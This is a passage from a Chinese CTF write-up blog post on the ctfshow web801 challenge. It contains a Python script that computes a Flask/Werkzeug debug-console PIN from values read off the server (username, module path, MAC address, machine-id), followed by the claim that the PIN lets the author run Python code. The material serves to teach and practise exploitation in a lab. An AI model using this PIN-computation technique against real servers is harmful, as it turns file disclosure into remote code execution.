class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">旧版计算PIN码#sha1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&quot;root&quot;</span>,<span class="comment">#通过文件读取linux可以查看/etc/passwd，windows可以查看C:/Users目录</span></span><br><span class="line">    <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#默认值为flask.app</span></span><br><span class="line">    <span class="string">&quot;Flask&quot;</span>,<span class="comment">#默认值Flask</span></span><br><span class="line">    <span class="string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span>,<span class="comment">#获取模块的文件路径，实际应用中通过报错读取</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:de:8a&#x27;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#/sys/class/net/eth0/address获取mac地址</span></span><br><span class="line">mac=<span class="built_in">str</span>(<span class="built_in">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits =[</span><br><span class="line">    mac,</span><br><span class="line">    <span class="string">&quot;225374fa-04bc-4346-9f39-48fa82829ca903287d31024982f285492f0b58ee6c3aecd972e6dc7b85209d4b4dc471a9a91f&quot;</span><span class="comment">#机器码</span></span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(private_bits)</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode()</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[&#x27;2485377621642&#x27;, &#x27;225374fa-04bc-4346-9f39-48fa82829ca903287d31024982f285492f0b58ee6c3aecd972e6dc7b85209d4b4dc471a9a91f&#x27;]</span></span><br><span class="line"><span class="string">261-357-408</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到pin码261-357-408，传入后就可以执行python代码了</p>
+<p><img src="/../image/achieve/202411/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/image-20250829183704166.png" alt="image-20250829183704166"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">H0me</a></li>
+        
+          <li><a href="/about/">A6out</a></li>
+        
+          <li><a href="/tags/">T6gs</a></li>
+        
+          <li><a href="/categories/">Catagory</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">s4arch</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web801"><span class="toc-number">1.</span> <span class="toc-text">web801</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E8%AE%A1%E7%AE%97pin%E5%80%BC"><span class="toc-number">1.1.</span> <span class="toc-text">#flask计算pin值</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&text=ctfshow入门常用姿势"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&is_video=false&description=ctfshow入门常用姿势"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow入门常用姿势&body=Check out this article: https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&title=ctfshow入门常用姿势"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&name=ctfshow入门常用姿势&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/29/ctfshow%E5%85%A5%E9%97%A8%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/&t=ctfshow入门常用姿势"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        
+<footer id="footer">
+    <div class="footer-left">
+        Copyright ©
+        
+        
+        2024-2025
+        wanTh3flag
+        <br>
+    </div>
+    
+    <div class="footer-right">
+        <nav>
+            <ul>
+                <!--
+                --><li><a href="/">H0me</a></li><!--
+                --><!--
+                --><li><a href="/about/">A6out</a></li><!--
+                --><!--
+                --><li><a href="/tags/">T6gs</a></li><!--
+                --><!--
+                --><li><a href="/categories/">Catagory</a></li><!--
+                --><!--
+                --><li><a href="/links/">L1nks</a></li><!--
+                --><!--
+                --><li><a href="/search/">s4arch</a></li><!--
+                -->
+            </ul>
+            <ul>
+                
+                <!-- 不蒜子统计 -->
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+                <span class="post-meta-divider">|</span>
+                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+                
+            </ul>
+        </nav>
+    </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
